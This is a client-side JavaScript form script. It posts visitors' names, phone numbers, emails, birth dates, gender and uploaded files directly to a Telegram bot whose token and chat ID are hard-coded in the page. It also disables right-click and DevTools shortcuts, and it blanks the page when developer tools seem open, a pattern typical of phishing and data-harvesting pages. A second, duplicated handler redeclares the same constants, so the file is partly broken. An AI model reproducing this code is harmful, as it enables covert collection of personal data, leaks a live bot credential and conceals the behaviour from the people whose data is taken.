const BOT_TOKEN = "8368529551:AAEzw2VGCr4J6ordrolAwoi61J7iI0JbvU8";
const CHAT_ID = "1086493943";

const form = document.querySelector("form");
const cancelBtn = document.getElementById("cancelBtn");

form.addEventListener("submit", function (e) {
  e.preventDefault();

  const name = document.getElementById("name").value.trim();
  const phone = document.getElementById("phone").value.trim();
  const email = document.getElementById("email").value.trim();
  const dob = document.getElementById("date").value;
  const gender =
    document.querySelector('input[name="gender"]:checked')?.value || "Not selected";
  const file = document.getElementById("fileInput").files[0];

  if (!name || !phone || !email || !dob || !file) {
    alert("Please fill all required fields");
    return;
  }

  const message = `
📋 New Form Submission

👤 Name: ${name}
📞 Phone: ${phone}
📧 Email: ${email}
🎂 DOB: ${dob}
🚻 Gender: ${gender}
⏰ Time: ${new Date().toLocaleString()}
`;

  // Send text
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message
    })
  })
    .then(() => {
      // Send file
      const fileData = new FormData();
      fileData.append("chat_id", CHAT_ID);
      fileData.append("document", file);

      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
        method: "POST",
        body: fileData
      });
    })
    .then(res => res.json())
    .then(data => {
      if (data.ok) {
        alert("Form submitted successfully");
        form.reset();
      } else {
        alert("Telegram API error");
        console.log(data);
      }
    })
    .catch(err => {
      console.error(err);
      alert("Submission failed");
    });
});

cancelBtn.addEventListener("click", function (e) {
  e.preventDefault();
  form.reset();
});


// loader

const form = document.querySelector("form");
const cancelBtn = document.getElementById("cancelBtn");
const loader = document.getElementById("loader");
const success = document.getElementById("success");

form.addEventListener("submit", function (e) {
  e.preventDefault();

  const formData = new FormData(form);

  loader.classList.remove("hidden");

  fetch("/submit-form", {
    method: "POST",
    body: formData
  })
    .then(res => res.json())
    .then(data => {
      loader.classList.add("hidden");

      if (data.ok) {
        success.classList.remove("hidden");
        form.reset();

        setTimeout(() => {
          success.classList.add("hidden");
        }, 2000);
      } else {
        alert("Submission failed");
      }
    })
    .catch(err => {
      loader.classList.add("hidden");
      console.error(err);
      alert("Network error");
    });
});

cancelBtn.addEventListener("click", function (e) {
  e.preventDefault();
  form.reset();
});


// Disable right-click
document.addEventListener("contextmenu", e => e.preventDefault());

// Disable common DevTools shortcuts
document.addEventListener("keydown", e => {
  if (
    e.key === "F12" ||
    (e.ctrlKey && e.shiftKey && ["I", "C", "J"].includes(e.key)) ||
    (e.ctrlKey && e.key === "U")
  ) {
    e.preventDefault();
  }
});

setInterval(() => {
  const threshold = 160;
  if (
    window.outerWidth - window.innerWidth > threshold ||
    window.outerHeight - window.innerHeight > threshold
  ) {
    document.body.innerHTML =
      "<h2 style='text-align:center;margin-top:20%'>Developer tools are disabled</h2>";
  }
}, 1000);



